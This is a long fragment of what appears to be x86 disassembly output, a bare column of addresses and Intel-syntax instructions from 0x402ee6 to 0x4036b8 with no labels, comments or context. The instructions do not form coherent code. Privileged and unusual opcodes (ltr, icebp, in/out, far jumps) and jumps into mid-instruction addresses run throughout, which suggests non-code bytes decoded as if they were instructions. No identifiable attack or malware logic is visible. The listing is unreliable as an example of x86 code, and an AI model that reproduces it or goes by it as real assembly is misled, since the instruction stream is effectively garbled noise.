  402ee6:	add    DWORD PTR [eax+0x20838580],esp
  402eec:	add    DWORD PTR [ebp+eax*1-0x7feff2ef],eax
  402ef3:	push   eax
  402ef4:	add    eax,0x40001913
  402ef9:	add    BYTE PTR [esi],al
  402efb:	loopne 0x402ec1
  402efd:	ltr    WORD PTR [eax+0x41]
  402f01:	inc    eax
  402f02:	or     bl,BYTE PTR [edx+0x20a50004]
  402f08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f09:	push   esp
  402f0a:	icebp  
  402f0b:	in     eax,0x9
  402f0d:	mov    BYTE PTR [ecx],al
  402f0f:	adc    BYTE PTR [ecx-0x5b],0x80
  402f13:	sbb    esp,DWORD PTR [esi+eax*1+0x40]
  402f17:	add    BYTE PTR [ecx+eax*2+0x4407008],al
  402f1e:	and    BYTE PTR [edx+edx*4],cl
  402f21:	inc    eax
  402f22:	xor    BYTE PTR ds:0xc0343028,ah
  402f28:	and    BYTE PTR [eax+0x8],ah
  402f2b:	push   0x1838044a
  402f30:	jb     0x402f7c
  402f32:	int    0x87
  402f34:	add    eax,DWORD PTR [eax+0x0]
  402f37:	enter  0x2100,0xad
  402f3b:	adc    BYTE PTR [eax+0x2488142],dl
  402f41:	test   BYTE PTR [eax],bh
  402f43:	cdq    
  402f44:	inc    eax
  402f45:	xor    BYTE PTR [esp+eax*1+0x6002050d],al
  402f4c:	or     al,BYTE PTR [eax]
  402f4e:	or     DWORD PTR [edx+ebp*1-0x7bea0100],esp
  402f55:	add    DWORD PTR [ebx+0x0],0x82030880
  402f5c:	add    al,BYTE PTR [eax]
  402f5e:	out    0x3,al
  402f60:	adc    DWORD PTR [ecx],eax
  402f62:	dec    esp
  402f63:	add    BYTE PTR [eax],ch
  402f65:	and    BYTE PTR [edx+eax*1],ch
  402f68:	add    DWORD PTR [esp+ecx*8],ebp
  402f6b:	add    al,al
  402f6d:	add    BYTE PTR [eax+0x11],al
  402f70:	mov    ah,0x0
  402f72:	les    esp,FWORD PTR [eax]
  402f74:	test   al,0x98
  402f76:	adc    al,0x80
  402f78:	add    ah,BYTE PTR [eax+0x18029100]
  402f7e:	or     BYTE PTR [eax-0x60],al
  402f81:	shl    BYTE PTR [eax],1
  402f83:	add    al,0x22
  402f85:	add    BYTE PTR [ecx+eax*4],al
  402f88:	xchg   edx,eax
  402f89:	add    al,BYTE PTR [eax]
  402f8b:	nop
  402f8c:	add    BYTE PTR [eax+eiz*8],al
  402f8f:	and    dl,BYTE PTR [eax+eiz*8]
  402f92:	enter  0x6408,0xa4
  402f96:	pusha  
  402f97:	push   ss
  402f98:	sub    BYTE PTR [ecx],al
  402f9a:	xor    al,0x80
  402f9c:	dec    ecx
  402f9d:	push   es
  402f9e:	add    al,0x4
  402fa0:	adc    BYTE PTR ds:0x62e03408,0x51
  402fa7:	sub    BYTE PTR [eax+eiz*2],dl
  402faa:	test   BYTE PTR [edx],al
  402fac:	add    al,al
  402fae:	inc    edx
  402faf:	add    BYTE PTR [esp+esi*1+0x301090a0],cl
  402fb6:	or     DWORD PTR [eax+edx*1],eax
  402fb9:	inc    eax
  402fba:	add    BYTE PTR [edx+edx*1],0x10
  402fbe:	and    eax,0x102404d0
  402fc3:	adc    BYTE PTR [eax-0x39],cl
  402fc6:	rol    BYTE PTR [esi],0x10
  402fc9:	add    BYTE PTR [eax+0x6],al
  402fcc:	jo     0x402fdb
  402fce:	sub    ebx,DWORD PTR [ecx]
  402fd0:	xor    BYTE PTR [ecx],0xa4
  402fd3:	add    BYTE PTR [edx-0x6b],al
  402fd6:	add    DWORD PTR [ecx+0x69070208],edx
  402fdc:	and    BYTE PTR [ecx],ah
  402fde:	rol    BYTE PTR [ecx],1
  402fe0:	add    al,BYTE PTR [edi]
  402fe2:	add    eax,0x14900000
  402fe7:	add    eax,0x14000034
  402fec:	and    al,0x10
  402fee:	adc    BYTE PTR [eax+eiz*4],al
  402ff1:	inc    edx
  402ff2:	sub    al,0x27
  402ff4:	cmp    DWORD PTR [ecx],eax
  402ff6:	push   ecx
  402ff7:	call   0x9245411f
  402ffc:	adc    al,0x0
  402ffe:	add    DWORD PTR [ebx],edx
  403000:	pop    es
  403001:	sub    BYTE PTR [edi-0x3c],dl
  403004:	and    al,0x80
  403006:	sbb    BYTE PTR [edx],cl
  403008:	add    BYTE PTR [ecx+eax*2],al
  40300b:	sub    ecx,DWORD PTR [ecx]
  40300d:	test   BYTE PTR [eax],dh
  40300f:	and    BYTE PTR [eax],cl
  403011:	sub    al,0x80
  403013:	add    esp,DWORD PTR [eax]
  403015:	add    DWORD PTR [ecx],0x49051042
  40301b:	sub    BYTE PTR [eax],0x69
  40301e:	and    al,0x2
  403020:	inc    esi
  403021:	xor    BYTE PTR [edi],dl
  403023:	or     BYTE PTR [eax],ch
  403025:	and    al,0x4c
  403027:	add    BYTE PTR [eax],bl
  403029:	mov    al,ds:0x8022c058
  40302e:	dec    eax
  40302f:	add    BYTE PTR [eax+ebp*4+0x40],0x10
  403034:	add    BYTE PTR [eax],ah
  403036:	add    al,BYTE PTR [eax+eiz*1-0x5dff44f0]
  40303d:	add    bl,BYTE PTR [eax+0x101e8022]
  403043:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403044:	add    al,0xc4
  403046:	and    al,0x2
  403048:	dec    eax
  403049:	add    BYTE PTR [edx+0x0],dl
  40304c:	adc    al,0x28
  40304e:	add    DWORD PTR [edx],eax
  403050:	add    al,BYTE PTR [eax]
  403052:	sub    BYTE PTR [ebp+eax*1-0x75ff9ba0],al
  403059:	cmp    DWORD PTR [edi+0x59],edx
  40305c:	add    ah,BYTE PTR [eax-0x6efd5c80]
  403062:	add    BYTE PTR [ecx-0x7e],al
  403065:	sbb    WORD PTR [eax],cx
  403068:	adc    edx,DWORD PTR [eax+ecx*1+0x5]
  40306c:	adc    DWORD PTR [eax],edx
  40306e:	sbb    BYTE PTR [esi+eiz*2],al
  403071:	adc    BYTE PTR [eax],ah
  403073:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403074:	rcl    cl,0x1
  403077:	xor    al,0x10
  403079:	inc    eax
  40307a:	inc    eax
  40307b:	and    BYTE PTR [eax],al
  40307d:	mov    BYTE PTR [eax-0x7337f75e],al
  403083:	or     al,0x0
  403085:	add    BYTE PTR [edx],al
  403087:	loopne 0x4030ad
  403089:	inc    ecx
  40308a:	or     al,0xa2
  40308c:	gs push es
  40308e:	lock sub DWORD PTR [esi-0x70],ecx
  403092:	mov    eax,ds:0x9840a010
  403097:	sub    al,0x20
  403099:	adc    BYTE PTR [ecx+0x16004991],dh
  40309f:	xchg   ecx,eax
  4030a0:	add    dl,BYTE PTR [esi]
  4030a2:	dec    eax
  4030a3:	sbb    BYTE PTR [edx+0x50],dl
  4030a6:	or     BYTE PTR [ecx],al
  4030a8:	sbb    BYTE PTR [esi+0x9550100],ah
  4030ae:	and    BYTE PTR [eax],al
  4030b0:	adc    BYTE PTR [ebx+0x22aa34a0],0x12
  4030b7:	inc    eax
  4030b8:	and    DWORD PTR es:[eax],eax
  4030bb:	push   es
  4030bc:	xchg   esi,eax
  4030bd:	mov    al,ds:0xc0201310
  4030c2:	pop    esi
  4030c3:	sbb    DWORD PTR [eax],0x27
  4030c6:	xor    DWORD PTR [ecx],0x3a801a48
  4030cc:	xor    DWORD PTR [eax+0x86013c6],0x43
  4030d3:	sub    BYTE PTR [eax],cl
  4030d5:	sbb    DWORD PTR [eax],eax
  4030d7:	add    DWORD PTR [eax+eax*1],esp
  4030da:	or     al,BYTE PTR [eax+0x2a0041b6]
  4030e0:	ret    0x430
  4030e3:	xchg   DWORD PTR [eax],ebx
  4030e5:	add    al,0x40
  4030e7:	cwde   
  4030e8:	add    dl,BYTE PTR [eax]
  4030ea:	add    BYTE PTR [eax+edx*1],bl
  4030ed:	or     BYTE PTR [eax+0x0],0x0
  4030f1:	or     al,0xb1
  4030f3:	sbb    DWORD PTR [eax+0x34],esp
  4030f6:	xchg   esp,eax
  4030f7:	add    BYTE PTR [ecx],0x80
  4030fa:	or     BYTE PTR [eax-0x4df37fdd],cl
  403100:	and    BYTE PTR [eax+0x24862ec],al
  403106:	inc    ecx
  403107:	push   ecx
  403108:	mov    ds:0x22808208,al
  40310d:	nop
  40310e:	inc    esp
  40310f:	push   es
  403110:	xchg   ebp,eax
  403111:	mov    DWORD PTR [edx-0x5e074ffc],esp
  403117:	and    BYTE PTR [eax+0x4],0x3d
  40311b:	or     BYTE PTR [eax],al
  40311d:	adc    BYTE PTR [esp+eax*1-0x60],0x5
  403122:	adc    BYTE PTR [eax],0x10
  403125:	add    dh,BYTE PTR [esp+ecx*4]
  403128:	or     DWORD PTR [eax],ebp
  40312a:	add    BYTE PTR [ebp+0xea439],al
  403130:	cwde   
  403131:	add    DWORD PTR [edx],ebp
  403133:	add    BYTE PTR ds:0x21080a,al
  403139:	add    al,0xd
  40313b:	dec    ebx
  40313c:	add    DWORD PTR [ebx],eax
  40313e:	push   eax
  40313f:	inc    ecx
  403140:	mov    eax,es
  403142:	sub    dl,0x84
  403145:	or     BYTE PTR [eax],bh
  403147:	or     BYTE PTR [edx],cl
  403149:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40314a:	es sub al,0xa8
  40314d:	mov    BYTE PTR fs:[eax+0x11200010],0x3
  403155:	or     BYTE PTR [eax],cl
  403157:	cmp    al,0x0
  403159:	jle    0x40317b
  40315b:	sub    BYTE PTR [esi],al
  40315d:	or     BYTE PTR [edx+eax*1+0x10],al
  403161:	or     dl,BYTE PTR [eax+0x1]
  403164:	mov    al,ds:0xb543140d
  403169:	popa   
  40316a:	and    BYTE PTR [ecx+0x56e3204a],cl
  403170:	jae    0x40317c
  403172:	add    cl,BYTE PTR [ecx-0x60]
  403175:	add    DWORD PTR [eax+eax*2-0x7fbbbffb],eax
  40317c:	sub    DWORD PTR [ebx+0x22],eax
  40317f:	cmp    al,0x21
  403181:	add    BYTE PTR [ecx],al
  403183:	add    BYTE PTR ds:0x78a8e44,0xa0
  40318a:	loopne 0x40318c
  40318c:	popf   
  40318d:	xchg   edx,eax
  40318e:	outs   dx,DWORD PTR ds:[esi]
  40318f:	sbb    DWORD PTR [eax+ecx*4],eax
  403192:	push   es
  403193:	and    BYTE PTR [eax+0x140052],cl
  403199:	inc    esp
  40319a:	add    dh,al
  40319c:	sbb    al,0x60
  40319e:	or     DWORD PTR [eax-0x7bbe3f3e],eax
  4031a4:	add    DWORD PTR [edx+eax*2],eax
  4031a7:	inc    esp
  4031a8:	or     BYTE PTR [ebx+0x401c00a0],al
  4031ae:	and    eax,DWORD PTR [ecx]
  4031b0:	call   0x1:0x44080540
  4031b7:	push   eax
  4031b8:	inc    ebx
  4031b9:	add    BYTE PTR [ecx-0x70],al
  4031bc:	xor    dh,al
  4031be:	test   DWORD PTR [edi],esi
  4031c0:	inc    ecx
  4031c1:	or     DWORD PTR [esi+0x51],edx
  4031c4:	mov    al,0x32
  4031c6:	xor    DWORD PTR [edx],edx
  4031c8:	inc    ecx
  4031c9:	adc    BYTE PTR [eax+0x30],0xd
  4031cd:	dec    esp
  4031ce:	lea    ebx,[eax]
  4031d0:	add    BYTE PTR [esi],al
  4031d2:	push   es
  4031d3:	xor    al,BYTE PTR [edx]
  4031d5:	les    ebp,FWORD PTR [eax]
  4031d7:	or     esp,DWORD PTR [edx+0x2165b25]
  4031dd:	mov    al,0x12
  4031df:	jb     0x403174
  4031e1:	or     eax,0x122102
  4031e6:	sbb    BYTE PTR [edx+0x2b],0x8
  4031ea:	sbb    DWORD PTR [ecx],ebx
  4031ec:	xchg   esp,eax
  4031ed:	mov    al,ds:0x48002002
  4031f2:	pop    es
  4031f3:	push   eax
  4031f4:	sub    BYTE PTR [ecx],al
  4031f6:	test   BYTE PTR [ebp+eax*1+0x11],dl
  4031fa:	les    eax,FWORD PTR [edi]
  4031fc:	mov    ch,0x66
  4031fe:	sbb    DWORD PTR [ecx],esi
  403200:	inc    esp
  403201:	sar    BYTE PTR [ecx+edx*1],0x29
  403205:	sub    BYTE PTR [eax*1+0x2403010],0x5d
  40320d:	mov    WORD PTR [eax+0x3022080],es
  403213:	or     eax,DWORD PTR [edx+0x5]
  403216:	add    BYTE PTR [eax+ebp*4],0x2
  40321a:	inc    ecx
  40321b:	xchg   DWORD PTR [edi],eax
  40321d:	or     BYTE PTR [eax],al
  40321f:	add    BYTE PTR [ecx],al
  403221:	inc    edx
  403222:	xchg   cx,ax
  403224:	and    BYTE PTR [edx+0x491c1122],al
  40322a:	inc    ecx
  40322b:	test   eax,0x40821801
  403230:	add    BYTE PTR [ecx+0x12ac881c],cl
  403236:	add    eax,0x8a1404ba
  40323b:	mov    al,ds:0x401200
  403240:	adc    BYTE PTR [edi-0x80],al
  403243:	add    DWORD PTR [eax],0xffffffd8
  403246:	xor    BYTE PTR [eax],0x80
  403249:	sub    BYTE PTR [eax],cl
  40324b:	add    cl,BYTE PTR [eax-0x60]
  40324e:	add    BYTE PTR [esi],al
  403250:	push   ss
  403251:	add    dl,ah
  403253:	or     bl,dh
  403255:	and    ecx,DWORD PTR [edx+0x10200040]
  40325b:	add    al,0x0
  40325d:	pusha  
  40325e:	pusha  
  40325f:	inc    eax
  403260:	enter  0xd20,0xc4
  403264:	push   es
  403265:	mov    ah,0x21
  403267:	add    al,0x0
  403269:	and    BYTE PTR [eax],al
  40326b:	cmp    DWORD PTR [edx+0x2196e020],eax
  403271:	add    BYTE PTR [eax],0xa8
  403274:	test   BYTE PTR [eax],ah
  403276:	inc    eax
  403277:	xchg   ebp,eax
  403278:	add    al,0x70
  40327a:	sbb    BYTE PTR [eax],al
  40327c:	in     eax,0x21
  40327e:	adc    BYTE PTR [ecx],0x9
  403281:	inc    eax
  403282:	mov    ds:0x876040a0,eax
  403287:	add    ah,BYTE PTR [edi]
  403289:	out    0x94,al
  40328b:	loope  0x403285
  40328d:	sbb    al,0x1
  40328f:	adc    BYTE PTR [ebx],dl
  403291:	or     BYTE PTR [ecx+ebx*1],dl
  403294:	add    BYTE PTR [eax],ah
  403296:	adc    BYTE PTR [esi],dl
  403298:	loope  0x40329a
  40329a:	sub    BYTE PTR [ebp+0x15],cl
  40329d:	xor    BYTE PTR [eax],ch
  40329f:	xor    al,0x1
  4032a1:	loopne 0x4032e8
  4032a3:	adc    BYTE PTR [esi+eiz*1+0x8614648],0x63
  4032ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4032ac:	or     ecx,DWORD PTR [eax+0x0]
  4032af:	add    eax,0x31020404
  4032b4:	test   eax,0x80402540
  4032b9:	add    al,ah
  4032bb:	sub    BYTE PTR [edx+esi*1+0x42a30021],ah
  4032c2:	adc    BYTE PTR [ecx+0x0],cl
  4032c5:	add    BYTE PTR [eax],dl
  4032c7:	jmp    0x100a:0x6942b304
  4032ce:	or     BYTE PTR [edx+0x682040e0],al
  4032d4:	and    BYTE PTR [edi+0x20],al
  4032d7:	and    BYTE PTR [eax],cl
  4032d9:	test   BYTE PTR [eax+0x18c4187a],dh
  4032df:	sbb    BYTE PTR [eax],al
  4032e1:	add    BYTE PTR [ecx],al
  4032e3:	bound  edx,QWORD PTR [eax+0x508414]
  4032e9:	adc    al,0x2
  4032eb:	add    BYTE PTR [eax],al
  4032ed:	pusha  
  4032ee:	add    al,0x41
  4032f0:	and    BYTE PTR [eax],0x58
  4032f3:	bound  esp,QWORD PTR [eax]
  4032f5:	and    BYTE PTR [esi],al
  4032f7:	les    eax,FWORD PTR [eax]
  4032f9:	pushf  
  4032fa:	inc    ebx
  4032fb:	adc    BYTE PTR [ebx+0x4011048f],al
  403301:	or     dh,BYTE PTR [eax]
  403303:	mov    BYTE PTR [eax+0x20],cl
  403306:	sbb    eax,DWORD PTR [esi+0x9]
  403309:	add    BYTE PTR [eax-0x28],al
  40330c:	add    BYTE PTR [eax],ah
  40330e:	add    DWORD PTR [eax],eax
  403310:	add    DWORD PTR [esi+0x20],eax
  403313:	sub    BYTE PTR [eax+edx*1-0x80],0x3c
  403318:	inc    esp
  403319:	and    bl,BYTE PTR [ebx]
  40331b:	or     eax,0x811a9028
  403320:	mov    al,ds:0x950080
  403325:	mov    fs,WORD PTR [eax]
  403327:	test   DWORD PTR [ecx+eax*1],ebp
  40332a:	loopne 0x40332c
  40332c:	pusha  
  40332d:	sub    BYTE PTR [eax],al
  40332f:	fs js  0x403333
  403332:	ror    BYTE PTR [ebp-0x1ffef56e],0x0
  403339:	add    al,0x84
  40333b:	mov    al,0x0
  40333d:	sbb    cl,BYTE PTR [edi]
  40333f:	add    BYTE PTR [edx],al
  403341:	and    al,0x30
  403343:	nop
  403344:	fs push 0x5bc01400
  40334a:	add    BYTE PTR [eax],dl
  40334c:	sub    DWORD PTR [ebx+0x40],eax
  40334f:	add    al,0x25
  403351:	add    BYTE PTR [eax],dl
  403353:	mov    ch,0x10
  403355:	inc    eax
  403356:	and    BYTE PTR [edx+0x0],0x0
  40335a:	add    BYTE PTR [ebp+0x46],al
  40335d:	mov    al,BYTE PTR [esi]
  40335f:	add    al,0xc5
  403361:	inc    eax
  403362:	and    BYTE PTR [edx-0x5f],dl
  403365:	add    al,BYTE PTR [ecx-0x60]
  403368:	nop
  403369:	cwde   
  40336a:	add    BYTE PTR [ecx],al
  40336c:	push   eax
  40336d:	ins    DWORD PTR es:[edi],dx
  40336e:	cmp    ah,BYTE PTR [edx]
  403370:	add    BYTE PTR [eax],cl
  403372:	add    al,0x49
  403374:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403375:	ret    
  403376:	inc    esp
  403377:	or     ah,al
  403379:	add    BYTE PTR [esi],al
  40337b:	push   eax
  40337c:	mov    BYTE PTR [eax],al
  40337e:	pop    es
  40337f:	add    BYTE PTR [eax],al
  403381:	and    BYTE PTR [eax],al
  403383:	add    eax,0x95800880
  403388:	and    al,BYTE PTR [ecx+0x4]
  40338b:	adc    BYTE PTR [ebp+0x4a20404],al
  403391:	add    BYTE PTR ds:0x84610c2,bh
  403397:	and    BYTE PTR [eax+0x4460041d],al
  40339d:	xor    BYTE PTR ds:0x128203c2,ah
  4033a3:	or     BYTE PTR [esi],cl
  4033a5:	xor    al,0x0
  4033a7:	sub    edx,DWORD PTR [eax+0x21290155]
  4033ad:	or     DWORD PTR [edx+0x10],0x5aa74280
  4033b4:	inc    edx
  4033b5:	inc    esp
  4033b6:	mov    WORD PTR [eax],es
  4033b8:	xor    BYTE PTR [edi+0x60],dl
  4033bb:	mov    al,0x0
  4033bd:	or     edx,eax
  4033bf:	add    BYTE PTR [ebx-0x77dfe7cf],cl
  4033c5:	adc    edx,DWORD PTR [ebp+0x1208400]
  4033cb:	add    BYTE PTR [eax+0x0],ah
  4033ce:	sbb    al,0x50
  4033d0:	push   es
  4033d1:	adc    BYTE PTR [ebx],cl
  4033d3:	adc    al,0x80
  4033d5:	add    DWORD PTR [eax+eiz*1],eax
  4033d8:	add    BYTE PTR [edx-0x1bfd8dc0],al
  4033de:	add    BYTE PTR [eax+0x3604a812],dl
  4033e4:	inc    eax
  4033e5:	adc    BYTE PTR [ecx-0x6c],al
  4033e8:	xor    al,0x20
  4033ea:	adc    al,0x90
  4033ed:	mov    eax,0x34141140
  4033f2:	add    BYTE PTR [edx],al
  4033f4:	lods   al,BYTE PTR ds:[esi]
  4033f5:	or     esp,DWORD PTR [ebx+0x0]
  4033f8:	add    BYTE PTR [eax+0x43],0x97
  4033fc:	add    cl,BYTE PTR [edx]
  4033fe:	or     ah,BYTE PTR ds:0x10706406
  403404:	or     BYTE PTR [eax+ebx*4],al
  403407:	add    al,0x82
  403409:	add    BYTE PTR [ebx],dh
  40340b:	and    BYTE PTR [eax],ah
  40340d:	mov    DWORD PTR [ecx],0x20c802
  403413:	pop    es
  403414:	and    eax,DWORD PTR [ebx]
  403416:	or     al,0x39
  403418:	inc    ecx
  403419:	test   BYTE PTR [edx+0x1085800],ah
  40341f:	inc    ecx
  403420:	add    BYTE PTR [ebx],al
  403422:	nop
  403423:	add    eax,DWORD PTR [esi]
  403425:	and    eax,0xb82c405a
  40342a:	add    BYTE PTR [eax],al
  40342c:	or     BYTE PTR [edx],al
  40342e:	push   ss
  40342f:	push   eax
  403430:	mov    BYTE PTR [eax],al
  403432:	mov    cl,0x14
  403434:	or     al,0x1d
  403436:	rol    BYTE PTR [eax],0x34
  403439:	inc    edx
  40343a:	xchg   ebp,eax
  40343b:	and    BYTE PTR [eax+0x57204404],cl
  403441:	sub    al,0x0
  403443:	rol    BYTE PTR [eax+eax*4],cl
  403446:	add    DWORD PTR [eax-0x7d],eax
  403449:	mov    al,ds:0x12220603
  40344e:	mov    ds:0x24a12002,al
  403453:	pop    ecx
  403454:	popa   
  403455:	add    BYTE PTR [eax+0x2044a8],al
  40345b:	add    DWORD PTR [ebx],eax
  40345d:	and    BYTE PTR [eax+0x60],0x8
  403461:	and    BYTE PTR [ecx],al
  403463:	mov    ah,BYTE PTR [ecx]
  403465:	push   eax
  403466:	fiadd  DWORD PTR [ecx-0x80]
  403469:	inc    esp
  40346a:	test   BYTE PTR [edx],al
  40346c:	adc    edx,DWORD PTR [ecx]
  40346e:	adc    BYTE PTR [eax],0x98
  403471:	and    dl,BYTE PTR [eax+0x20035801]
  403477:	and    DWORD PTR [eax],ecx
  403479:	xor    BYTE PTR [eax+0x485814d5],al
  40347f:	push   ebx
  403480:	push   cs
  403481:	dec    eax
  403482:	or     BYTE PTR [eax],ah
  403484:	pusha  
  403485:	push   ecx
  403486:	sbb    BYTE PTR [eax+0x4e201480],al
  40348c:	js     0x40342e
  40348e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40348f:	xchg   al,al
  403491:	xor    DWORD PTR [ecx-0x4f],0x53d830
  403498:	or     BYTE PTR [eax],cl
  40349a:	add    BYTE PTR [eax+eax*1],ah
  40349d:	and    BYTE PTR [edx+0x45822c49],al
  4034a3:	add    esp,eax
  4034a5:	adc    DWORD PTR [eax],eax
  4034a7:	sub    BYTE PTR [eax+0x2484028],al
  4034ad:	adc    BYTE PTR [eax+0x0],0x14
  4034b1:	push   esp
  4034b2:	loope  0x4034b5
  4034b4:	push   edi
  4034b5:	add    BYTE PTR [eax],ah
  4034b7:	inc    eax
  4034b8:	push   eax
  4034b9:	inc    edx
  4034ba:	and    ah,BYTE PTR [edx+0x14]
  4034bd:	and    al,0x41
  4034bf:	mov    BYTE PTR [edi+0x13],al
  4034c2:	xor    dl,BYTE PTR [ecx+eiz*2]
  4034c5:	add    dh,BYTE PTR [ecx]
  4034c7:	dec    eax
  4034c8:	repnz or BYTE PTR [eax-0x7fb7bfff],dl
  4034cf:	inc    esi
  4034d0:	pop    edx
  4034d1:	stc    
  4034d2:	pusha  
  4034d3:	add    DWORD PTR [eax],edx
  4034d5:	add    BYTE PTR [edx],al
  4034d7:	add    eax,0x50843218
  4034dc:	sbb    al,BYTE PTR [edx]
  4034de:	or     edx,DWORD PTR [edx]
  4034e0:	xor    eax,0x80a0291
  4034e5:	push   es
  4034e6:	xor    DWORD PTR [edx+0x20010281],eax
  4034ec:	xor    BYTE PTR [eax-0x74b4b160],al
  4034f2:	xor    eax,0xc107080c
  4034f7:	add    BYTE PTR [ecx+eax*1-0x1fbefde0],al
  4034fe:	add    al,BYTE PTR [edx]
  403500:	add    eax,edi
  403502:	add    bl,BYTE PTR [edx]
  403504:	add    BYTE PTR [eax],bh
  403506:	cwde   
  403507:	add    BYTE PTR [eax+0x2],dl
  40350a:	add    BYTE PTR [eax],al
  40350c:	add    BYTE PTR [edx+ecx*1],al
  40350f:	or     BYTE PTR [eax],ah
  403511:	pop    ecx
  403512:	adc    DWORD PTR [eax+0xb],0xffffff9c
  403516:	adc    dh,BYTE PTR [ecx]
  403518:	or     BYTE PTR [eax-0xf9e36ef],0x21
  40351f:	push   esp
  403520:	add    BYTE PTR [eax],ah
  403522:	dec    edx
  403523:	push   eax
  403524:	and    dl,BYTE PTR [eax]
  403526:	mov    ah,0x8e
  403528:	inc    ecx
  403529:	adc    BYTE PTR [ecx+0x44],0x23
  40352d:	sbb    BYTE PTR [eax+eiz*4],al
  403530:	add    BYTE PTR [ebx+0x40],ah
  403533:	adc    al,0x8
  403535:	sub    DWORD PTR [esi-0x60],edx
  403538:	and    BYTE PTR [ecx-0x6b5fecb7],0x70
  40353f:	push   0x406641a1
  403544:	mov    eax,0x4c108006
  403549:	xor    BYTE PTR [esp+eax*1],al
  40354c:	mov    cl,0x0
  40354e:	cmp    BYTE PTR [eax],al
  403550:	inc    esi
  403551:	and    BYTE PTR [eax+0x4845892],0x6e
  403558:	add    dl,BYTE PTR [eax+ecx*1]
  40355b:	inc    eax
  40355c:	xor    al,0x24
  40355e:	and    bl,dl
  403560:	add    BYTE PTR [edx],al
  403562:	and    BYTE PTR [edi+0x2b092028],al
  403568:	add    BYTE PTR [ecx],al
  40356a:	and    al,0x33
  40356c:	add    BYTE PTR [eax+0x18000000],0x2
  403573:	daa    
  403574:	add    BYTE PTR [ebx],al
  403576:	or     BYTE PTR [ecx],cl
  403578:	test   al,0x14
  40357a:	mov    dl,0x61
  40357c:	add    BYTE PTR [eax+0x24],ah
  40357f:	push   0x30a283
  403584:	inc    ebx
  403585:	mov    eax,ds:0xc5092409
  40358a:	add    BYTE PTR [eax],al
  40358c:	sbb    BYTE PTR [edx],0x20
  40358f:	push   esp
  403590:	and    al,BYTE PTR [eax]
  403592:	inc    esp
  403593:	sub    BYTE PTR [esp+eax*2],0x89
  403597:	xchg   edx,eax
  403598:	test   BYTE PTR [ecx],bl
  40359a:	test   BYTE PTR [eax+eax*1],bl
  40359d:	or     BYTE PTR [eax-0x80],ch
  4035a0:	add    BYTE PTR [ebp+0xa004100],ah
  4035a6:	test   BYTE PTR [ecx],ah
  4035a8:	les    esp,FWORD PTR [ebx+eax*4]
  4035ab:	sub    eax,0x10d18822
  4035b0:	ret    0x808
  4035b3:	add    BYTE PTR [ecx],al
  4035b5:	inc    eax
  4035b6:	add    BYTE PTR [eax+eiz*1],al
  4035b9:	push   0xa0a20000
  4035be:	dec    eax
  4035bf:	push   eax
  4035c0:	adc    DWORD PTR ds:0x20620002,eax
  4035c6:	inc    esi
  4035c7:	add    al,0xae
  4035c9:	xchg   ecx,eax
  4035ca:	sbb    edx,DWORD PTR [eax-0x7fb79ffc]
  4035d0:	add    BYTE PTR [eax+0x62],dh
  4035d3:	adc    DWORD PTR [eax],eax
  4035d5:	mov    dl,BYTE PTR [eax]
  4035d7:	mov    ds:0x1c800040,al
  4035dc:	adc    al,0xa2
  4035de:	or     BYTE PTR [esp+eax*1],dh
  4035e1:	dec    eax
  4035e2:	add    bl,BYTE PTR [eax]
  4035e4:	push   edx
  4035e5:	add    BYTE PTR [ecx+0x41],al
  4035e8:	and    DWORD PTR [ebp+0x25],0xf0080a00
  4035ef:	add    BYTE PTR [eax+0x2128824],0x4
  4035f6:	adc    eax,0x4c009521
  4035fb:	pusha  
  4035fc:	and    BYTE PTR [ecx],cl
  4035fe:	stos   BYTE PTR es:[edi],al
  4035ff:	inc    edx
  403600:	add    DWORD PTR es:[eax],eax
  403603:	add    BYTE PTR [eax],0x1c
  403606:	repnz inc esp
  403608:	add    BYTE PTR [eax+eax*2],al
  40360b:	and    BYTE PTR ds:0x42084e80,0x4
  403612:	xchg   DWORD PTR [edx-0x3c],eax
  403615:	sub    al,BYTE PTR [eax]
  403617:	and    al,BYTE PTR [edx]
  403619:	and    al,0xc0
  40361b:	sub    BYTE PTR [eax+0x2],cl
  40361e:	nop
  40361f:	adc    al,0xc
  403621:	adc    eax,0x3c141034
  403626:	adc    BYTE PTR gs:[ebx+edx*1],cl
  40362a:	sub    cl,BYTE PTR [ecx]
  40362c:	and    eax,0x60300208
  403631:	pop    edx
  403632:	nop
  403633:	and    al,0x0
  403635:	adc    BYTE PTR [eax+0x0],al
  403638:	add    BYTE PTR [eax],al
  40363a:	and    BYTE PTR [ebx+eax*4],cl
  40363d:	test   BYTE PTR [eax],al
  40363f:	inc    esp
  403640:	or     DWORD PTR [ebx],0x30
  403643:	push   ss
  403644:	or     DWORD PTR [eax+0x11700],esp
  40364a:	add    eax,ecx
  40364c:	cmp    BYTE PTR [eax+ecx*1+0x7],al
  403650:	xchg   ebx,eax
  403651:	fs pusha 
  403653:	inc    esp
  403654:	sbb    al,BYTE PTR [eax+0x0]
  403657:	jmp    0x12914964
  40365c:	or     BYTE PTR [eax],al
  40365e:	retf   
  40365f:	push   eax
  403660:	add    BYTE PTR [edx],al
  403662:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403663:	or     BYTE PTR [edx+eiz*1+0x73],0x14
  403668:	shl    BYTE PTR [eax],0xcb
  40366b:	and    al,BYTE PTR [eax]
  40366d:	add    BYTE PTR [eax],ah
  40366f:	dec    edx
  403670:	or     BYTE PTR [eax],al
  403672:	and    BYTE PTR [eax+0x40088096],dh
  403678:	es inc eax
  40367a:	enter  0x8160,0x8
  40367e:	push   esp
  40367f:	add    BYTE PTR [eax],0xd0
  403682:	add    BYTE PTR ds:0x2000010,dl
  403688:	add    BYTE PTR [eax+eiz*4],cl
  40368b:	add    DWORD PTR [eax+0x4a5922b3],eax
  403691:	xor    DWORD PTR [ebx+eax*1+0xb04a00],eax
  403698:	or     BYTE PTR [eax+0x0],al
  40369b:	push   ecx
  40369c:	cmp    BYTE PTR [ecx+0x40],cl
  40369f:	add    BYTE PTR [esp+eax*4+0x120c6180],dh
  4036a6:	shl    BYTE PTR [eax+0x402044b],1
  4036ac:	gs inc esp
  4036ae:	add    BYTE PTR [eax+0x7f9b200c],0x8
  4036b5:	and    al,0x62
  4036b7:	inc    esp
  4036b8:	add    DWORD PTR [ecx],0xa8200800
